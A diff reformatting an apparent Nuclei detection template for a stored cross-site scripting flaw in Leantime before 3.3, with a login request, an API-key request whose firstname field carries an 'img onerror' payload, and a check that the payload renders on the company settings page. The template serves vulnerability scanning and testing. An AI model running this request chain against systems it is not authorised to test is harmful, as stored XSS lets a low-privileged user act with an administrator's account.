@@ -1,68 +1,76 @@
-id: leantime-stored-xss
-
-info:
-  name: Leantime < 3.3 = Cross-Site Scripting
-  author: iamnoooob,rootxharsh,pdresearch
-  severity: high
-  description: |
-    Any low privileged user like manager, or editor, can create an API key with XSS payload. When admin will visit the Company page, the XSS will automatically get triggerred leading to the unauthorized action performed from the ADMIN account. Like, removing any user, or adding someone else as high privilege, and many more.
-  reference:
-    - https://github.com/advisories/GHSA-c39w-3pjx-qc7m
-  tags: leantime,xss,stored,authenticated,vuln
-
 flow: http(1) && http(2) && http(3)
-
-variables:
-  username: "{{username}}"
-  password: "{{password}}"
-
 http:
-  - raw:
-      - |
-        POST /auth/login HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+- matchers:
+  - part: body
+    type: word
+    words:
+    - /dashboard/home
+  raw:
+  - 'POST /auth/login HTTP/1.1
 
-        redirectUrl=http%253A%252F%252F{{Hostname}}%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login
+    Host: {{Hostname}}
 
-    matchers:
-      - type: word
-        part: body
-        words:
-          - /dashboard/home
+    Content-Type: application/x-www-form-urlencoded
 
-  - raw:
-      - |
-        POST /api/newApiKey HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-        save=1&firstname=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&role=5&status=a&submitAction=Save
+    redirectUrl=http%253A%252F%252F{{Hostname}}%252Fdashboard%252Fhome&username={{username}}&password={{password}}&login=Login
 
-    matchers:
-      - type: word
-        part: body
-        words:
-          - 'message: "notification.api_key_created", style: "success"'
+    '
+- matchers:
+  - part: body
+    type: word
+    words:
+    - 'message: "notification.api_key_created", style: "success"'
+  raw:
+  - 'POST /api/newApiKey HTTP/1.1
 
-  - raw:
-      - |
-        GET /setting/editCompanySettings/ HTTP/1.1
-        Host: {{Hostname}}
+    Host: {{Hostname}}
 
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
-        words:
-          - '<img src=x onerror=alert(document.domain)>'
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
-      - type: word
-        part: header
-        words:
-          - "text/html"
 
-      - type: status
-        status:
-          - 200
-# digest: 490a004630440220167ad947231bcceddd503781c8a07a0c0c8d00f1930d1e0beebc7990ee24fe6e02205249b42d1f1ebbf8a6dc4994b9b786fb36d1500d1d2ef52b296293649baf06c7:922c64590222798bb761d5b6d8e72950
+    save=1&firstname=%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&role=5&status=a&submitAction=Save
+
+    '
+- matchers:
+  - part: body
+    type: word
+    words:
+    - <img src=x onerror=alert(document.domain)>
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  raw:
+  - 'GET /setting/editCompanySettings/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+id: leantime-stored-xss
+info:
+  author: iamnoooob,rootxharsh,pdresearch
+  classification:
+    cwe-id:
+    - CWE-79
+    - CWE-83
+  description: 'Any low privileged user like manager, or editor, can create an API
+    key with XSS payload. When admin will visit the Company page, the XSS will automatically
+    get triggerred leading to the unauthorized action performed from the ADMIN account.
+    Like, removing any user, or adding someone else as high privilege, and many more.
+
+    '
+  metadata:
+    runzero-review: 'REJECT/2026-04-14/auto: forbidden tag: authenticated'
+  name: Leantime < 3.3 = Cross-Site Scripting
+  reference:
+  - https://github.com/advisories/GHSA-c39w-3pjx-qc7m
+  severity: high
+  tags: authenticated,leantime,stored,vuln,xss
+variables:
+  password: '{{password}}'
+  username: '{{username}}'
